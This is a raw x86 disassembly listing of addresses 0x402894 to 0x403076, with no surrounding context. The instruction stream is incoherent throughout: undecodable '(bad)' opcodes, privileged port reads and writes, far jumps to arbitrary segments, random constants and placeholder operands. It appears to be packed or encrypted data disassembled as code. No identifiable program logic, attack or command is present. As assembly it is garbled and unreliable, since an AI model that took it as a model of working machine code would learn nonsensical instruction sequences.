  402894:	sbb    dh,BYTE PTR [edi+0x6d]
  402897:	cmp    edx,ebx
  402899:	out    dx,eax
  40289a:	fimul  WORD PTR [edx-0x64]
  40289d:	pop    ecx
  40289e:	cmp    al,0x8f
  4028a0:	pop    esp
  4028a1:	cmc    
  4028a2:	das    
  4028a3:	mov    dh,0xaa
  4028a5:	pop    ecx
  4028a6:	test   al,0xe3
  4028a8:	iret   
  4028a9:	ins    BYTE PTR es:[edi],dx
  4028aa:	sbb    BYTE PTR [edi],ch
  4028ac:	enter  0x7d50,0x68
  4028b0:	inc    ebp
  4028b1:	lea    edi,[esi+0x2bb07e2a]
  4028b7:	inc    esi
  4028b8:	imul   DWORD PTR [ebx+eiz*4-0x7ef45e97]
  4028bf:	add    al,0xd
  4028c1:	jg     0x40287a
  4028c3:	enter  0x294b,0x91
  4028c7:	jne    0x4028ec
  4028c9:	xchg   ebx,eax
  4028cb:	idiv   DWORD PTR [eax*4+0x57172a70]
  4028d2:	ud1    esp,DWORD PTR [eax-0x3d]
  4028d6:	enter  0x4576,0xed
  4028da:	leave  
  4028db:	ds mov bl,0x41
  4028de:	xlat   BYTE PTR ds:[ebx]
  4028df:	dec    esp
  4028e0:	(bad)  
  4028e1:	and    al,0xb4
  4028e3:	ret    0xc42
  4028e6:	sub    eax,DWORD PTR [esi]
  4028e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028e9:	jmp    0xda17:0x3394d2cf
  4028f0:	lea    esi,[edx+0x3dffa5b4]
  4028f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028f7:	scas   al,BYTE PTR es:[edi]
  4028f8:	int3   
  4028f9:	pop    es
  4028fa:	jge    0x40289c
  4028fc:	cmp    al,BYTE PTR [esi-0x33644caf]
  402902:	mov    fs,WORD PTR [edx+0x35a63d65]
  402908:	idiv   DWORD PTR [ebp+0x59]
  40290b:	jmp    0x20e6:0xfa46fd20
  402912:	lods   al,BYTE PTR ds:[esi]
  402913:	cdq    
  402914:	cmp    al,BYTE PTR [ecx-0x50faac4e]
  40291a:	lahf   
  40291b:	pusha  
  40291c:	mov    BYTE PTR [ebx-0x26],0xc6
  402920:	xor    BYTE PTR [ebp+0x76b2f292],ah
  402926:	push   ecx
  402927:	cmc    
  402928:	daa    
  402929:	jb     0x4028cc
  40292b:	mov    al,0x9d
  40292d:	(bad)  [ebx-0x9]
  402930:	pushf  
  402931:	xchg   ebp,eax
  402932:	mov    ecx,0x5004f329
  402937:	xor    DWORD PTR [esi-0x3e772090],0xbb855bb7
  402941:	xor    ch,BYTE PTR [ecx+eiz*1-0x5f6d9c24]
  402948:	or     BYTE PTR [esi],bl
  40294a:	push   ebp
  40294b:	or     bl,BYTE PTR [ecx]
  40294d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40294e:	out    0x7,eax
  402950:	fisubr DWORD PTR [ebx+0x553a030]
  402956:	in     eax,dx
  402957:	lea    ebp,[edx+0x40c46af2]
  40295d:	push   edi
  40295e:	cmp    bl,BYTE PTR [edx]
  402960:	in     al,0xfc
  402962:	sbb    eax,0x14ffc81
  402967:	pop    ecx
  402968:	ror    DWORD PTR [esi],cl
  40296a:	sub    eax,0x5b6eb6bd
  40296f:	lock pop ebx
  402971:	lods   eax,DWORD PTR ds:[esi]
  402972:	aad    0x28
  402974:	out    0xde,eax
  402976:	fsubr  st(6),st
  402978:	push   cs
  402979:	jne    0x40294a
  40297b:	mov    eax,0x57fd5fba
  402980:	in     eax,0x32
  402982:	jne    0x4029e0
  402984:	or     esi,edx
  402986:	fst    QWORD PTR [esi+ecx*4]
  402989:	mov    BYTE PTR [edi+0x5a8df381],cl
  40298f:	add    bh,0x7a
  402992:	setge  BYTE PTR [ebp+0x29]
  402996:	enter  0xbbfa,0x11
  40299a:	mov    WORD PTR [ebx-0x5e],gs
  40299d:	cmp    al,0x1f
  40299f:	retf   0x779a
  4029a2:	mov    esp,DWORD PTR [esi]
  4029a4:	add    al,0xaf
  4029a6:	push   ebx
  4029a7:	retf   0x8cd7
  4029aa:	and    BYTE PTR [edx+0x530b022e],ch
  4029b0:	mov    bh,BYTE PTR [edi+0x1b]
  4029b3:	mov    cl,0x26
  4029b5:	mov    esi,ds
  4029b7:	cwde   
  4029b8:	cld    
  4029b9:	xchg   DWORD PTR [edx],edx
  4029bb:	add    DWORD PTR [esi+0x70e417cc],eax
  4029c1:	mov    ecx,0x8c8292a1
  4029c6:	mov    ch,0xf3
  4029c8:	sub    al,0x8a
  4029ca:	cdq    
  4029cb:	mov    eax,ds:0x1f85d8a0
  4029d0:	outs   dx,BYTE PTR ds:[esi]
  4029d1:	(bad)  
  4029d2:	imul   ebx,ebp,0xe410dc2f
  4029d8:	or     ecx,DWORD PTR [eax]
  4029da:	mov    cl,al
  4029dc:	jge    0x4029de
  4029de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029df:	ret    0x164f
  4029e2:	rol    dl,1
  4029e4:	cmp    eax,0x1ca5a26c
  4029e9:	pushf  
  4029ea:	sub    eax,0xd265a443
  4029ef:	xor    BYTE PTR [ebx],0xfa
  4029f2:	test   bh,bh
  4029f4:	inc    ebx
  4029f5:	in     eax,0xa0
  4029f7:	or     BYTE PTR [ecx+esi*8+0x20f32e1],cl
  4029fe:	loop   0x402a61
  402a00:	add    eax,DWORD PTR [ecx+ecx*1+0xdc30235]
  402a07:	fwait
  402a08:	into   
  402a09:	out    0xd6,eax
  402a0b:	stos   DWORD PTR es:[edi],eax
  402a0c:	in     eax,0x7c
  402a0e:	sbb    edi,eax
  402a10:	xor    ebx,DWORD PTR ds:[edi]
  402a13:	push   0x64
  402a15:	imul   eax,DWORD PTR [ebx+0x47],0x5445e604
  402a1c:	mov    es,ebp
  402a1e:	pushf  
  402a1f:	sbb    dh,bh
  402a21:	jae    0x4029ed
  402a23:	and    bh,BYTE PTR [ebx+0x48]
  402a26:	fucom  st(5)
  402a28:	gs sbb eax,0x9ee4ee3b
  402a2e:	out    dx,eax
  402a2f:	std    
  402a30:	rcr    BYTE PTR [esi],cl
  402a32:	jmp    0x1b54:0xed19a154
  402a39:	add    DWORD PTR [eax+0x78],esi
  402a3c:	jae    0x402a3f
  402a3e:	inc    ecx
  402a3f:	leave  
  402a40:	sub    eax,0x9b7fb8fa
  402a45:	xchg   ebx,eax
  402a46:	or     BYTE PTR [eax],dh
  402a48:	sbb    BYTE PTR [ebx],bh
  402a4a:	das    
  402a4b:	add    eax,0x5ff01d80
  402a50:	add    eax,0x5c986b63
  402a55:	jle    0x402a82
  402a57:	mov    esi,0x64e5f48b
  402a5c:	mov    ebx,0x92d9ff9b
  402a61:	sahf   
  402a62:	push   0x563746b9
  402a67:	jb     0x402a4d
  402a69:	sahf   
  402a6a:	arpl   WORD PTR [esi+0x6df5700f],cx
  402a70:	sahf   
  402a71:	and    al,0x75
  402a73:	xchg   esi,eax
  402a74:	jle    0x402ab4
  402a76:	(bad)  
  402a77:	in     al,dx
  402a78:	je     0x402af9
  402a7a:	in     al,0xf6
  402a7c:	aam    0xa0
  402a7e:	push   esi
  402a7f:	pop    eax
  402a80:	push   bp
  402a82:	inc    ebx
  402a83:	mov    eax,0xe148d87e
  402a88:	mov    ?,edx
  402a8a:	cld    
  402a8b:	sub    bl,dl
  402a8d:	add    ah,BYTE PTR [ebx+0x35]
  402a90:	imul   esi,DWORD PTR [ecx+edi*8],0xffffffb6
  402a94:	push   ecx
  402a95:	fnstcw WORD PTR [ebp-0x39]
  402a98:	adc    ecx,DWORD PTR [edi+0x1aaf100b]
  402a9e:	sahf   
  402a9f:	iret   
  402aa0:	mov    cl,0x2a
  402aa2:	(bad)  [esi+0x3340d2d3]
  402aa8:	imul   esp,DWORD PTR [esi+edi*4+0x6c378670],0x4c
  402ab0:	mov    edx,0x4e6c887d
  402ab5:	jbe    0x402af6
  402ab7:	out    dx,eax
  402ab8:	or     edx,esi
  402aba:	dec    ebx
  402abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402abc:	enter  0xb3d9,0x3e
  402ac0:	ins    DWORD PTR es:[edi],dx
  402ac1:	pop    eax
  402ac2:	ins    BYTE PTR es:[edi],dx
  402ac3:	mov    eax,0xd9a9be09
  402ac8:	retf   
  402ac9:	mov    bh,0x6a
  402acb:	leave  
  402acc:	mov    DWORD PTR [esi+eiz*4-0x2a64bb9d],edx
  402ad3:	adc    al,0x9f
  402ad5:	push   ebp
  402ad6:	pop    es
  402ad7:	xor    DWORD PTR [edi+0x24bb626],esi
  402add:	xor    bh,BYTE PTR [edi]
  402adf:	cmc    
  402ae0:	(bad)  
  402ae1:	fstp   QWORD PTR [ecx-0x8]
  402ae4:	dec    eax
  402ae5:	jmp    0xee7bf87
  402aea:	ss pop edi
  402aec:	inc    ebp
  402aed:	add    al,bh
  402aef:	fdivr  DWORD PTR [esi-0x35ae5fdf]
  402af5:	jbe    0x402b36
  402af7:	scas   eax,DWORD PTR es:[edi]
  402af8:	mov    dl,0x98
  402afa:	into   
  402afb:	mov    ds:0x716ff934,eax
  402b00:	pop    es
  402b01:	lods   eax,DWORD PTR ds:[esi]
  402b02:	shl    DWORD PTR [edi-0x42],0xe2
  402b06:	jl     0x8a55c095
  402b0c:	push   0xffffff87
  402b0e:	cs xchg bh,ah
  402b11:	test   BYTE PTR [ebp-0x79dffb28],ah
  402b17:	repnz push ss
  402b19:	push   cs
  402b1a:	ss cmc 
  402b1c:	pop    esi
  402b1d:	je     0x402aeb
  402b1f:	pop    ecx
  402b20:	mov    ebp,0xd2caa39
  402b25:	dec    esp
  402b26:	ds push ds
  402b28:	mov    esp,0xc50fb815
  402b2d:	shl    cl,cl
  402b2f:	mov    esp,0x82ce0cae
  402b34:	xchg   ecx,eax
  402b35:	dec    ebx
  402b36:	scas   eax,DWORD PTR es:[edi]
  402b37:	sbb    edi,ecx
  402b39:	loop   0x402b53
  402b3b:	sub    BYTE PTR [eax+eax*1-0x4e327c78],bl
  402b42:	imul   esp,DWORD PTR [eax+0x8],0x7e02d281
  402b49:	mov    eax,ds:0xa31a02ff
  402b4e:	ss push ecx
  402b50:	xor    BYTE PTR [edx+0x61],bl
  402b53:	push   edi
  402b54:	adc    al,bh
  402b56:	data16 fmul DWORD PTR [edi-0x4be25ca3]
  402b5d:	outs   dx,BYTE PTR ds:[esi]
  402b5e:	lds    esp,FWORD PTR [esi+0x446cd281]
  402b64:	add    BYTE PTR [esi-0x19],bh
  402b67:	inc    ebp
  402b68:	cmp    BYTE PTR [edx],al
  402b6a:	ins    BYTE PTR es:[edi],dx
  402b6b:	stos   DWORD PTR es:[edi],eax
  402b6c:	lods   eax,DWORD PTR ds:[esi]
  402b6d:	or     al,0x25
  402b6f:	sbb    eax,0x21235c9f
  402b74:	mov    ds:0x4f4cba4d,al
  402b79:	ss fwait
  402b7b:	in     eax,dx
  402b7c:	inc    ebx
  402b7d:	cld    
  402b7e:	mov    edx,0xf237df44
  402b83:	int    0x53
  402b85:	out    dx,al
  402b86:	pop    esp
  402b87:	push   0x42
  402b89:	outs   dx,DWORD PTR ds:[esi]
  402b8a:	adc    edi,DWORD PTR [edx-0x7f]
  402b8d:	xchg   BYTE PTR [edi+edi*8-0x61ceb00b],bl
  402b94:	sbb    BYTE PTR [ecx+0x65651dce],dl
  402b9a:	pop    edi
  402b9b:	icebp  
  402b9c:	sbb    BYTE PTR [ebp-0x165850d3],al
  402ba2:	or     eax,0xef181463
  402ba7:	ror    BYTE PTR [esi],cl
  402ba9:	or     DWORD PTR [esi],0x3a
  402bac:	adc    DWORD PTR [ecx+0xe],ebx
  402baf:	inc    ebp
  402bb0:	mov    BYTE PTR [eax+0x7fe05aa4],cl
  402bb6:	and    al,0xa2
  402bb8:	mov    ah,0x64
  402bba:	cmp    al,0x77
  402bbc:	jnp    0x402bce
  402bbe:	add    esp,DWORD PTR [ebx]
  402bc0:	ins    BYTE PTR es:[edi],dx
  402bc1:	sbb    DWORD PTR [edi],0xcec0d355
  402bc7:	fs inc edi
  402bc9:	xor    bl,BYTE PTR [edx+0x1d]
  402bcc:	nop    DWORD PTR [ecx]
  402bcf:	push   ebx
  402bd0:	ret    0xb677
  402bd3:	and    ch,bl
  402bd5:	and    BYTE PTR [esi-0x1bab013d],cl
  402bdb:	pop    es
  402bdc:	pop    edi
  402bdd:	jmp    0x402ba8
  402bdf:	div    BYTE PTR [esp+ebp*1]
  402be2:	mov    al,ds:0x7d822389
  402be8:	dec    ecx
  402be9:	and    dl,al
  402beb:	mov    esi,0x12e9391e
  402bf0:	fbld   TBYTE PTR [ecx+edx*1-0x147ce646]
  402bf7:	xlat   BYTE PTR ds:[ebx]
  402bf8:	mov    esp,0x2f7e74f1
  402bfd:	es jns 0x402c69
  402c00:	in     eax,0x4
  402c02:	out    dx,al
  402c03:	cmc    
  402c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c05:	mov    ah,0x2c
  402c07:	lds    ecx,FWORD PTR [eax]
  402c09:	test   BYTE PTR [ecx+edi*1],0x71
  402c0d:	sub    BYTE PTR [edi],bl
  402c0f:	jle    0x402bcb
  402c11:	pusha  
  402c12:	dec    esi
  402c13:	popa   
  402c14:	pop    ecx
  402c15:	ror    DWORD PTR [eax+0x5ef20a7a],1
  402c1b:	cld    
  402c1c:	sti    
  402c1d:	and    esi,DWORD PTR [eax+0x48]
  402c20:	adc    BYTE PTR [esi+0x26842b5],al
  402c26:	mov    edi,0x2dc85915
  402c2b:	imul   esp,ecx,0x72874617
  402c31:	cld    
  402c32:	hlt    
  402c33:	std    
  402c34:	call   0xee8d:0xce001d72
  402c3b:	(bad)  
  402c3d:	imul   edx,DWORD PTR [esp-0x59],0x66133d86
  402c45:	rcl    ecx,cl
  402c47:	scas   al,BYTE PTR es:[edi]
  402c48:	inc    edi
  402c49:	mov    eax,ebx
  402c4b:	scas   al,BYTE PTR es:[edi]
  402c4c:	inc    ebp
  402c4d:	sub    ebp,ebx
  402c4f:	add    esi,ebp
  402c51:	int    0xb6
  402c53:	pop    ds
  402c54:	cmp    bl,al
  402c56:	mov    dh,0x4
  402c58:	stos   DWORD PTR es:[edi],eax
  402c59:	jge    0x402c73
  402c5b:	mov    ch,0x1b
  402c5d:	adc    DWORD PTR [ebx+ecx*2],eax
  402c60:	sbb    ecx,ebp
  402c62:	adc    eax,0x1c7b89f6
  402c67:	inc    esp
  402c68:	mov    edx,0x42f9bd5a
  402c6d:	add    al,BYTE PTR [ecx+0x26]
  402c70:	fbstp  TBYTE PTR [ebx+eax*1-0x14059767]
  402c77:	jo     0x402cbf
  402c79:	adc    BYTE PTR [edx+0x3223f10f],0x6b
  402c80:	and    DWORD PTR [ebx-0x64],esi
  402c83:	imul   edx,DWORD PTR [eax],0xdb8aad1a
  402c89:	inc    ebx
  402c8a:	or     eax,esp
  402c8c:	adc    eax,0x4a87a73c
  402c91:	inc    ebp
  402c92:	push   ebx
  402c93:	stos   BYTE PTR es:[edi],al
  402c94:	jp     0x402c2b
  402c96:	in     al,0xbe
  402c98:	cs or  al,0x85
  402c9b:	inc    ebp
  402c9c:	(bad)  
  402c9d:	mov    ebp,0x261166bf
  402ca2:	sub    edi,esp
  402ca4:	sub    BYTE PTR [ebp-0x5b16f68e],cl
  402caa:	ss mov cl,0x7c
  402cad:	pop    esp
  402cae:	sub    eax,0xf95c4ec3
  402cb3:	pop    ecx
  402cb4:	sub    al,0x1e
  402cb6:	lods   al,BYTE PTR ds:[esi]
  402cb7:	sub    ch,bh
  402cb9:	mov    edi,0x1fb05325
  402cbe:	cmp    eax,DWORD PTR [ecx-0x1faad57b]
  402cc4:	mov    dl,ch
  402cc6:	xor    ch,BYTE PTR [edx+0x52eb0991]
  402ccc:	ins    DWORD PTR es:[edi],dx
  402ccd:	jnp    0x402c60
  402ccf:	inc    edx
  402cd0:	xchg   esi,eax
  402cd1:	bound  edi,QWORD PTR [ecx+edi*8-0x2cb79ff5]
  402cd8:	stc    
  402cd9:	out    0x77,eax
  402cdb:	pop    edi
  402cdc:	lds    edi,FWORD PTR [esi-0x6afb96f5]
  402ce2:	mov    ebp,0xd8a05b74
  402ce7:	cmp    bl,ch
  402ce9:	jbe    0x402d58
  402ceb:	mov    dh,0x36
  402ced:	in     al,0x53
  402cef:	mov    bh,0xd6
  402cf1:	repnz or ebp,DWORD PTR [esi+0x4b]
  402cf5:	stos   BYTE PTR es:[edi],al
  402cf6:	fild   WORD PTR [ecx+0x75ae8aec]
  402cfc:	push   cs
  402cfd:	out    0xde,eax
  402cff:	mov    ds,WORD PTR [edi]
  402d01:	jbe    0x402cf0
  402d03:	dec    edi
  402d04:	adc    al,0xd0
  402d06:	push   ebp
  402d07:	in     eax,dx
  402d08:	lods   eax,DWORD PTR ds:[esi]
  402d09:	pop    ebx
  402d0a:	push   ebp
  402d0b:	shr    DWORD PTR [ebx-0x3b],1
  402d0e:	cmp    esp,0x48
  402d11:	aad    0xe
  402d13:	jge    0x402ccc
  402d15:	imul   edi,DWORD PTR [ecx-0x551f65c3],0xb1914c21
  402d1f:	pop    ebp
  402d20:	(bad)  
  402d21:	push   DWORD PTR [ebx+0x21c1224a]
  402d27:	adc    ebx,DWORD PTR [ebx-0x2b73ee72]
  402d2d:	mov    ecx,0x78d534fb
  402d32:	xor    eax,0x23e9345d
  402d37:	retf   0x497d
  402d3a:	aaa    
  402d3b:	popa   
  402d3c:	mov    BYTE PTR [esi+0x7e],dh
  402d3f:	inc    edx
  402d40:	stos   BYTE PTR es:[edi],al
  402d41:	icebp  
  402d42:	mov    edi,DWORD PTR [ebp+0x58]
  402d45:	rol    al,1
  402d47:	mov    BYTE PTR [ecx],bh
  402d49:	cmp    esi,eax
  402d4b:	mov    ds:0xce601568,al
  402d50:	sub    esp,DWORD PTR [esi+edx*8]
  402d53:	push   0xffffff9d
  402d55:	mov    eax,0xcfb57556
  402d5a:	outs   dx,BYTE PTR ds:[esi]
  402d5b:	or     eax,0xbcad9167
  402d60:	sahf   
  402d61:	shl    DWORD PTR [eax-0x61],cl
  402d64:	mov    ds:0x3992eee5,eax
  402d69:	mov    esi,0x447747b2
  402d6e:	mov    bl,0xa5
  402d70:	into   
  402d71:	mov    eax,ds:0x27bdccbc
  402d76:	cwd    
  402d78:	pop    ebp
  402d79:	jo     0x402d80
  402d7b:	aas    
  402d7c:	push   cs
  402d7d:	int3   
  402d7e:	jecxz  0x402d66
  402d80:	call   0x240c:0x67fd8793
  402d87:	(bad)  
  402d89:	ins    DWORD PTR es:[edi],dx
  402d8a:	or     bl,BYTE PTR [esi]
  402d8c:	dec    edx
  402d8d:	cmp    ebx,edi
  402d8f:	inc    eax
  402d90:	shr    DWORD PTR [ebp+0x76da2733],cl
  402d96:	sub    BYTE PTR [ecx+0x3fdbb895],ah
  402d9c:	cmp    DWORD PTR [edi],0x24f9f455
  402da2:	and    BYTE PTR [ecx-0x16],0xd8
  402da6:	cld    
  402da7:	inc    ebx
  402da8:	bound  esi,QWORD PTR [edx-0x77]
  402dab:	sbb    DWORD PTR [ecx],edx
  402dad:	pop    edx
  402dae:	add    al,0x89
  402db0:	pop    edi
  402db1:	xchg   edx,eax
  402db2:	sar    BYTE PTR [esi-0x2cb11574],cl
  402db8:	push   es
  402db9:	pop    esi
  402dba:	push   0x28
  402dbc:	mov    al,0x65
  402dbe:	in     al,0xe0
  402dc0:	push   esp
  402dc1:	repz and eax,0x15259540
  402dc7:	xchg   edi,eax
  402dc8:	out    dx,eax
  402dc9:	push   ds
  402dca:	das    
  402dcb:	push   eax
  402dcc:	sub    dl,0x3b
  402dcf:	shl    BYTE PTR [edi+0x62],cl
  402dd2:	cwde   
  402dd3:	mov    WORD PTR [ebp+0x4d],?
  402dd6:	int3   
  402dd7:	sti    
  402dd8:	fs add eax,0x3577d8e8
  402dde:	add    BYTE PTR [edx+0x24d4f56d],bh
  402de4:	adc    ebx,eax
  402de6:	mov    esp,0x39bd7e27
  402deb:	addr16 out 0x8a,al
  402dee:	mov    al,0x8c
  402df0:	xchg   esp,eax
  402df1:	sbb    edi,eax
  402df3:	jmp    0xfccd2f0d
  402df8:	add    esp,DWORD PTR ds:0x54c3cbf1
  402dfe:	lods   eax,DWORD PTR ds:[esi]
  402dff:	addr16 cmp al,al
  402e02:	stc    
  402e03:	scas   eax,DWORD PTR es:[edi]
  402e04:	call   0xb6ec:0xd9ea06de
  402e0b:	push   ds
  402e0c:	push   esi
  402e0d:	outs   dx,BYTE PTR ds:[esi]
  402e0e:	cmp    DWORD PTR [ecx-0x30c38a7b],ecx
  402e14:	movups XMMWORD PTR [edx+0x54],xmm6
  402e18:	xor    edi,DWORD PTR [edx-0x2a7cf9a9]
  402e1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e1f:	push   es
  402e20:	popa   
  402e21:	mov    esi,0xa048f8a9
  402e26:	push   eax
  402e27:	jb     0x402e15
  402e29:	loop   0x402e47
  402e2b:	mov    ss,WORD PTR [esi+0x5a1ce8e3]
  402e31:	jno    0x402e0f
  402e33:	arpl   WORD PTR [ebp-0x50],bp
  402e36:	inc    edx
  402e37:	xchg   ebx,eax
  402e38:	jmp    0x402e5a
  402e3a:	(bad)
  402e3d:	aam    0xb
  402e3f:	or     ah,cl
  402e41:	repnz and BYTE PTR [ebx-0x8],dl
  402e45:	sbb    ecx,DWORD PTR [edx-0x76]
  402e48:	aam    0x90
  402e4a:	clc    
  402e4b:	push   ebp
  402e4c:	sbb    cl,BYTE PTR [edi+0xa68758c]
  402e52:	(bad)  
  402e53:	idiv   bl
  402e55:	test   al,0x6e
  402e57:	retf   
  402e58:	ret    0x9ffe
  402e5b:	ss into 
  402e5d:	mov    al,ds:0x38918107
  402e62:	cdq    
  402e63:	shl    DWORD PTR [ebx+0x14],cl
  402e66:	jmp    0xdb71:0x23fd5dab
  402e6d:	call   0x17021010
  402e72:	mov    edx,0xb7d0395c
  402e77:	and    DWORD PTR [edi+0x5fe2160],0x12
  402e7e:	add    BYTE PTR [esi+0x37],dh
  402e81:	sub    eax,0x29cf3e1e
  402e86:	sbb    DWORD PTR [edx-0x511cc786],ebx
  402e8c:	stos   DWORD PTR es:[edi],eax
  402e8d:	mov    bh,0x74
  402e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e90:	fst    QWORD PTR [edx+0x76]
  402e93:	(bad)  [ecx-0x1cb82acb]
  402e99:	outs   dx,BYTE PTR ds:[esi]
  402e9a:	retf   
  402e9b:	in     eax,dx
  402e9c:	dec    ebp
  402e9d:	repz rcl BYTE PTR [ecx+0xdf60ad1],0xd0
  402ea5:	out    dx,al
  402ea6:	inc    esp
  402ea7:	mov    DWORD PTR [esi-0x63],eax
  402eaa:	adc    ch,al
  402eac:	pop    edi
  402ead:	in     eax,0x1c
  402eaf:	rol    DWORD PTR [eax],cl
  402eb1:	ss inc eax
  402eb3:	pop    eax
  402eb4:	or     edi,DWORD PTR [edx+ebp*1-0x4bb5eed0]
  402ebb:	mov    esp,0x6e44d97b
  402ec0:	mov    eax,ds:0xf65d556d
  402ec5:	xchg   esi,eax
  402ec6:	mov    ecx,0xa791178
  402ecb:	inc    eax
  402ecc:	rcr    DWORD PTR [edi+0x1],cl
  402ecf:	sub    cl,0x32
  402ed2:	stos   DWORD PTR es:[edi],eax
  402ed3:	cmp    ebx,DWORD PTR [ebp+0x125a09cb]
  402ed9:	jne    0x402f0a
  402edb:	test   eax,0x7a4b49c5
  402ee0:	add    esp,DWORD PTR [eiz*8-0x390949ef]
  402ee7:	addr16 ret 
  402ee9:	and    edi,DWORD PTR [ebx-0x658e482e]
  402eef:	aam    0x45
  402ef1:	push   0xffffff91
  402ef3:	test   BYTE PTR [ecx+0x553ced03],0x4b
  402efa:	sbb    eax,0xcad90986
  402eff:	int    0x44
  402f01:	xor    eax,0xd7174024
  402f06:	dec    edx
  402f07:	out    0x2,al
  402f09:	jno    0x402ed7
  402f0b:	sub    ebx,DWORD PTR [ebx-0x6f]
  402f0e:	fcmovnu st,st(0)
  402f10:	out    dx,al
  402f11:	cdq    
  402f12:	cmp    al,0xf8
  402f14:	jno    0x402f08
  402f16:	pusha  
  402f17:	(bad)  
  402f18:	cmp    eax,0x8f491017
  402f1d:	out    dx,al
  402f1e:	mov    eax,ds:0x6afaee1c
  402f23:	jge    0x402ec4
  402f25:	sbb    cl,dl
  402f27:	adc    bl,dl
  402f29:	int3   
  402f2a:	mov    fs,WORD PTR [edx-0x24]
  402f2d:	dec    edi
  402f2e:	sub    ebx,edx
  402f30:	inc    ecx
  402f31:	xchg   ecx,eax
  402f32:	or     dl,BYTE PTR [ebx]
  402f34:	jne    0x402f68
  402f36:	test   al,0x1
  402f38:	arpl   WORD PTR [eax],di
  402f3a:	jne    0x402fb7
  402f3c:	(bad)  
  402f3e:	test   DWORD PTR ds:0x1b6e6b03,eax
  402f44:	xlat   BYTE PTR ds:[ebx]
  402f45:	sub    BYTE PTR [edi+0x50],dl
  402f48:	dec    BYTE PTR [ebp+0xa066e35]
  402f4e:	outs   dx,BYTE PTR ds:[esi]
  402f4f:	popf   
  402f50:	adc    al,0x84
  402f52:	hlt    
  402f53:	pusha  
  402f54:	and    DWORD PTR [esi+eiz*4+0x3b],0xad617675
  402f5c:	sbb    ecx,DWORD PTR [edi+0x10]
  402f5f:	and    esp,edi
  402f61:	retf   0xdb83
  402f64:	or     BYTE PTR [edx],0x35
  402f67:	int    0x96
  402f69:	mov    ds:0xc36f30d7,eax
  402f6e:	mov    bh,0xb2
  402f70:	enter  0x9160,0x9a
  402f74:	int    0xab
  402f76:	adc    esp,DWORD PTR [eax]
  402f78:	test   al,0xcb
  402f7a:	mov    cl,0x86
  402f7c:	and    BYTE PTR [ecx],bh
  402f7e:	repz sub edi,ecx
  402f81:	cmp    edi,DWORD PTR [ebx+ecx*1-0x1f]
  402f85:	sti    
  402f86:	fisttp QWORD PTR [edi-0x712239b]
  402f8c:	or     bl,BYTE PTR [ecx-0x18]
  402f8f:	sbb    bh,BYTE PTR [ebx]
  402f91:	out    0xa0,eax
  402f93:	jbe    0x402f67
  402f95:	dec    ecx
  402f96:	push   eax
  402f97:	pop    ds
  402f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f99:	push   ss
  402f9a:	and    ebx,DWORD PTR ds:0x2465981c
  402fa0:	pushf  
  402fa1:	push   ebp
  402fa2:	adc    BYTE PTR [edx],ah
  402fa4:	leave  
  402fa5:	shl    BYTE PTR [esi-0xb],cl
  402fa8:	xlat   BYTE PTR ds:[ebx]
  402fa9:	mov    ecx,0xd11ca81b
  402fae:	repnz push esp
  402fb0:	dec    ecx
  402fb1:	(bad)  [ebx]
  402fb3:	(bad)  
  402fb4:	inc    edi
  402fb5:	icebp  
  402fb6:	adc    edx,esp
  402fb8:	mov    ecx,0x979d8dd7
  402fbd:	dec    ecx
  402fbe:	mov    esp,DWORD PTR [esi]
  402fc0:	ins    BYTE PTR es:[edi],dx
  402fc1:	lock cmp DWORD PTR [esi-0x3c371045],0xcc864e13
  402fcc:	xchg   DWORD PTR [edi],edi
  402fce:	xor    cl,bl
  402fd0:	(bad)  
  402fd1:	pusha  
  402fd2:	mov    ebp,0xd32fa9d0
  402fd7:	scas   eax,DWORD PTR es:[edi]
  402fd8:	aam    0xac
  402fda:	aam    0x18
  402fdc:	aad    0x7e
  402fde:	ins    DWORD PTR es:[edi],dx
  402fdf:	xchg   esi,eax
  402fe0:	dec    eax
  402fe1:	push   edi
  402fe3:	mov    edi,0x693edd20
  402fe8:	ficom  DWORD PTR [edx+0x70]
  402feb:	(bad)  ds:0x376238d1
  402ff1:	or     al,0xbd
  402ff3:	(bad)  
  402ff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ff5:	out    0x6d,al
  402ff7:	leave  
  402ff8:	clc    
  402ff9:	imul   ebp,DWORD PTR [edi-0x5f],0x35
  402ffd:	xchg   ebp,eax
  402ffe:	push   esp
  402fff:	push   0xffffffa4
  403001:	fcomp  DWORD PTR [ebx-0x38]
  403004:	call   DWORD PTR [ebx]
  403006:	xchg   ebp,eax
  403007:	fidiv  WORD PTR [ebp+0x30]
  40300a:	gs xchg ebp,eax
  40300c:	ins    DWORD PTR es:[edi],dx
  40300d:	mov    ecx,0x602d0b4b
  403012:	mov    ds:0xae55d94d,al
  403017:	test   BYTE PTR [edi],0x90
  40301a:	lods   al,BYTE PTR ds:[esi]
  40301b:	fdivrp st(1),st
  40301d:	retf   0x9a06
  403020:	inc    edx
  403021:	mov    ds:0x16db1fef,al
  403026:	fwait
  403027:	call   0x7500:0xf45ca7fe
  40302e:	xor    al,0x7b
  403030:	inc    esi
  403031:	ins    BYTE PTR es:[edi],dx
  403032:	fucom  st(2)
  403034:	loopne 0x403012
  403036:	inc    esp
  403037:	mov    al,0x40
  403039:	cmp    bh,BYTE PTR ds:0xd66dce3
  40303f:	xchg   ebp,eax
  403040:	sbb    esi,DWORD PTR [ebp+0x35]
  403043:	pop    edi
  403044:	or     eax,0x5224e637
  403049:	mov    esp,0xbf9d3857
  40304e:	xor    DWORD PTR [eax-0x6d],0x2cec6372
  403055:	popa   
  403056:	add    eax,0xf78feb19
  40305b:	jg     0x402fec
  40305d:	scas   eax,DWORD PTR es:[edi]
  40305e:	jo     0x40303d
  403060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403061:	mov    esp,0xb6d5f195
  403066:	add    BYTE PTR [ecx+0x9aced61],dl
  40306c:	sahf   
  40306d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40306e:	out    dx,al
  40306f:	ja     0x403010
  403071:	inc    ecx
  403072:	push   ds
  403073:	inc    eax
  403074:	ffreep st(7)
  403076:	ret    
